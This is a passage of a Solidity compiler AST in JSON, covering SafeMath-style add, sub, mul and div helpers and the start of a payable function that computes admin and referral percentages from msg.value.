              "src": "527:103:0",
              "statements": [
                {
                  "condition": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 40,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "id": 38,
                      "name": "_a",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 31,
                      "src": "537:2:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "argumentTypes": null,
                      "hexValue": "30",
                      "id": 39,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "543:1:0",
                      "subdenomination": null,
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "src": "537:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": null,
                  "id": 44,
                  "nodeType": "IfStatement",
                  "src": "533:36:0",
                  "trueBody": {
                    "id": 43,
                    "nodeType": "Block",
                    "src": "546:23:0",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "hexValue": "30",
                          "id": 41,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "561:1:0",
                          "subdenomination": null,
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "functionReturnParameters": 37,
                        "id": 42,
                        "nodeType": "Return",
                        "src": "554:8:0"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 49,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 45,
                      "name": "c",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 36,
                      "src": "574:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 48,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "argumentTypes": null,
                        "id": 46,
                        "name": "_a",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 31,
                        "src": "578:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "*",
                      "rightExpression": {
                        "argumentTypes": null,
                        "id": 47,
                        "name": "_b",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 33,
                        "src": "583:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "578:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "574:11:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 50,
                  "nodeType": "ExpressionStatement",
                  "src": "574:11:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 56,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 54,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "argumentTypes": null,
                            "id": 52,
                            "name": "c",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "598:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "/",
                          "rightExpression": {
                            "argumentTypes": null,
                            "id": 53,
                            "name": "_a",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 31,
                            "src": "602:2:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "598:6:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "argumentTypes": null,
                          "id": 55,
                          "name": "_b",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 33,
                          "src": "608:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "598:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 51,
                      "name": "assert",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 348,
                      "src": "591:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_assert_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 57,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "591:20:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 58,
                  "nodeType": "ExpressionStatement",
                  "src": "591:20:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 59,
                    "name": "c",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 36,
                    "src": "624:1:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 37,
                  "id": 60,
                  "nodeType": "Return",
                  "src": "617:8:0"
                }
              ]
            },
            "documentation": null,
            "id": 62,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "mul",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 34,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 31,
                  "name": "_a",
                  "nodeType": "VariableDeclaration",
                  "scope": 62,
                  "src": "469:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 30,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "469:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 33,
                  "name": "_b",
                  "nodeType": "VariableDeclaration",
                  "scope": 62,
                  "src": "481:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 32,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "481:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "468:24:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 37,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 36,
                  "name": "c",
                  "nodeType": "VariableDeclaration",
                  "scope": 62,
                  "src": "516:9:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 35,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "516:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "515:11:0"
            },
            "scope": 344,
            "src": "456:174:0",
            "stateMutability": "pure",
            "superFunction": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 75,
              "nodeType": "Block",
              "src": "703:25:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 73,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "id": 71,
                      "name": "_a",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "716:2:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "/",
                    "rightExpression": {
                      "argumentTypes": null,
                      "id": 72,
                      "name": "_b",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 66,
                      "src": "721:2:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "716:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 70,
                  "id": 74,
                  "nodeType": "Return",
                  "src": "709:14:0"
                }
              ]
            },
            "documentation": null,
            "id": 76,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "div",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 67,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 64,
                  "name": "_a",
                  "nodeType": "VariableDeclaration",
                  "scope": 76,
                  "src": "647:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 63,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "647:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 66,
                  "name": "_b",
                  "nodeType": "VariableDeclaration",
                  "scope": 76,
                  "src": "659:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 65,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "659:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "646:24:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 70,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 69,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 76,
                  "src": "694:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 68,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "694:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "693:9:0"
            },
            "scope": 344,
            "src": "634:94:0",
            "stateMutability": "pure",
            "superFunction": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 95,
              "nodeType": "Block",
              "src": "801:47:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 88,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "id": 86,
                          "name": "_b",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 80,
                          "src": "814:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "<=",
                        "rightExpression": {
                          "argumentTypes": null,
                          "id": 87,
                          "name": "_a",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 78,
                          "src": "820:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "814:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 85,
                      "name": "assert",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 348,
                      "src": "807:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_assert_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 89,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "807:16:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 90,
                  "nodeType": "ExpressionStatement",
                  "src": "807:16:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 93,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "id": 91,
                      "name": "_a",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 78,
                      "src": "836:2:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "-",
                    "rightExpression": {
                      "argumentTypes": null,
                      "id": 92,
                      "name": "_b",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 80,
                      "src": "841:2:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "836:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 84,
                  "id": 94,
                  "nodeType": "Return",
                  "src": "829:14:0"
                }
              ]
            },
            "documentation": null,
            "id": 96,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "sub",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 81,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 78,
                  "name": "_a",
                  "nodeType": "VariableDeclaration",
                  "scope": 96,
                  "src": "745:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 77,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "745:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 80,
                  "name": "_b",
                  "nodeType": "VariableDeclaration",
                  "scope": 96,
                  "src": "757:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 79,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "757:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "744:24:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 84,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 83,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 96,
                  "src": "792:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 82,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "792:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "791:9:0"
            },
            "scope": 344,
            "src": "732:116:0",
            "stateMutability": "pure",
            "superFunction": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 119,
              "nodeType": "Block",
              "src": "923:57:0",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 109,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 105,
                      "name": "c",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 103,
                      "src": "929:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 108,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "argumentTypes": null,
                        "id": 106,
                        "name": "_a",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 98,
                        "src": "933:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "+",
                      "rightExpression": {
                        "argumentTypes": null,
                        "id": 107,
                        "name": "_b",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 100,
                        "src": "938:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "933:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "929:11:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 110,
                  "nodeType": "ExpressionStatement",
                  "src": "929:11:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 114,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "id": 112,
                          "name": "c",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 103,
                          "src": "953:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">=",
                        "rightExpression": {
                          "argumentTypes": null,
                          "id": 113,
                          "name": "_a",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 98,
                          "src": "958:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "src": "953:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 111,
                      "name": "assert",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 348,
                      "src": "946:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_assert_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 115,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "946:15:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 116,
                  "nodeType": "ExpressionStatement",
                  "src": "946:15:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 117,
                    "name": "c",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": 103,
                    "src": "974:1:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "functionReturnParameters": 104,
                  "id": 118,
                  "nodeType": "Return",
                  "src": "967:8:0"
                }
              ]
            },
            "documentation": null,
            "id": 120,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "add",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 101,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 98,
                  "name": "_a",
                  "nodeType": "VariableDeclaration",
                  "scope": 120,
                  "src": "865:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 97,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "865:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 100,
                  "name": "_b",
                  "nodeType": "VariableDeclaration",
                  "scope": 120,
                  "src": "877:10:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 99,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "877:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "864:24:0"
            },
            "payable": false,
            "returnParameters": {
              "id": 104,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 103,
                  "name": "c",
                  "nodeType": "VariableDeclaration",
                  "scope": 120,
                  "src": "912:9:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 102,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "912:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "911:11:0"
            },
            "scope": 344,
            "src": "852:128:0",
            "stateMutability": "pure",
            "superFunction": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 268,
              "nodeType": "Block",
              "src": "1010:823:0",
              "statements": [
                {
                  "assignments": [
                    124
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 124,
                      "name": "admRefPerc",
                      "nodeType": "VariableDeclaration",
                      "scope": 269,
                      "src": "1014:18:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 123,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1014:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "value": null,
                      "visibility": "internal"
                    }
                  ],
                  "id": 133,
                  "initialValue": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "arguments": [
                          {
                            "argumentTypes": null,
                            "expression": {
                              "argumentTypes": null,
                              "id": 127,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 359,
                              "src": "1043:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 128,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "value",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": null,
                            "src": "1043:9:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          {
                            "argumentTypes": null,
                            "hexValue": "35",
                            "id": 129,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1053:1:0",
                            "subdenomination": null,
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_5_by_1",
                              "typeString": "int_const 5"
                            },
                            "value": "5"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            {
                              "typeIdentifier": "t_rational_5_by_1",
                              "typeString": "int_const 5"
                            }
                          ],
                          "id": 126,
                          "name": "mul",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 62,
                          "src": "1039:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                            "typeString": "function (uint256,uint256) pure returns (uint256)"
                          }
                        },
                        "id": 130,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1039:16:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "argumentTypes": null,
                        "hexValue": "313030",
                        "id": 131,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1056:3:0",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        },
                        "value": "100"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        }
                      ],
                      "id": 125,
                      "name": "div",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 76,
                      "src": "1035:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                        "typeString": "function (uint256,uint256) pure returns (uint256)"
                      }
                    },
                    "id": 132,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1035:25:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1014:46:0"
                },
                {
                  "assignments": [
                    135
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 135,
                      "name": "advPerc",
                      "nodeType": "VariableDeclaration",
                      "scope": 269,
                      "src": "1064:15:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 134,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1064:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "value": null,
                      "visibility": "internal"
                    }
                  ],
                  "id": 144,
                  "initialValue": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "arguments": [
                          {
                            "argumentTypes": null,
                            "expression": {
                              "argumentTypes": null,
                              "id": 138,
                              "name": "msg",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 359,
                              "src": "1090:3:0",
